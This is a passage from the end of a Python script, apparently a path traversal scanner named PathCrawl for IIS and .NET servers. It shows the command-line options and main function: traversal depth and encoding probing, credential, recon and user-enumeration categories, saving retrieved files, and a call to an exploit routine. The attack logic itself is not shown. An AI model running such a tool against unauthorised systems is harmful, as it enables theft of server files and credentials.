    parser.add_argument("-t", "--threads", type=int, default=3, help="Concurrent threads (default: 3, be gentle)")
    parser.add_argument("--delay", type=float, default=0.3, help="Delay between requests per thread in seconds (default: 0.3)")
    parser.add_argument("--max-depth", type=int, default=12, help="Max traversal depth to probe (default: 12)")
    parser.add_argument("--encoding", help="Force specific encoding (skip auto-detect)")
    parser.add_argument("--depth", type=int, help="Force specific depth (skip auto-detect)")
    parser.add_argument("--users", help="Comma-separated usernames to check (default: common names)")
    parser.add_argument("--stack", default="any", choices=["any", "iis", "dotnet", "dotnet-core"],
                        help="Web stack filter (default: any)")
    parser.add_argument("--categories", help="Comma-separated categories to test (creds,recon,user-enum,custom)")
    parser.add_argument("-f", "--file", action="append", help="Additional file path to check (can repeat)")
    parser.add_argument("--save-dir", help="Directory to save retrieved file contents")
    parser.add_argument("-o", "--output", help="Output file for report")
    parser.add_argument("--json", action="store_true", help="JSON output format (with -o)")
    parser.add_argument("--no-colour", action="store_true", help="Disable coloured output")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

    args = parser.parse_args()

    if args.no_colour or not sys.stdout.isatty():
        NO_COLOUR = True

    if args.encoding:
        if args.encoding not in ENCODINGS:
            parser.error(f"Unknown encoding: {args.encoding}. Options: {', '.join(ENCODINGS.keys())}")

    crawler = PathCrawl(args)

    if args.encoding and args.depth:
        crawler.working_encoding = args.encoding
        crawler.working_depth = args.depth
        print(cyan(BANNER))
        print(green(f"  [+] Using forced encoding={args.encoding} depth={args.depth}\n"))
        crawler._baseline()
        crawler._discover_users()
        crawler.exploit()
        crawler.report()
    else:
        crawler.run()


if __name__ == "__main__":
    main()
